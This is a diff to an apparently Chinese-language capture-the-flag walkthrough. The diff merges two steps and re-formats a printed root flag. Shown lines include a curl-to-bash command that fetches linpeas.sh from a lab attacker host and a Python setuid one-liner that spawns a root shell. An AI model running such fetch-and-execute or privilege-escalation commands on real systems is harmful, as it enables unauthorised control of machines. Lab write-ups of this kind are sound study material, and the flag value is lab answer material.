@@ -91,11 +91,7 @@ curl http://10.10.14.29/linpeas.sh | bash > check.txt
 
  <img width="637" height="93" alt="image" src="https://github.com/user-attachments/assets/84c35daa-e3f5-4823-a3a5-a5ab9a4aef89" />
 
-19.	下載並執行linpeas.sh，可以看到LinPEAS.sh列出可用的漏洞。
-
-20.	直接執行 Python 指令就可以提升權限，提升權限後，印出root.txt。
+19.	下載並執行linpeas.sh，可以看到LinPEAS.sh列出可用的漏洞。直接執行 Python 指令就可以提升權限，提升權限後，印出root.txt。
 /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 id && whoami
-
-12bfd933b27aadc7948d94fc6ab2d1ac
-
+==12bfd933b27aadc7948d94fc6ab2d1ac==
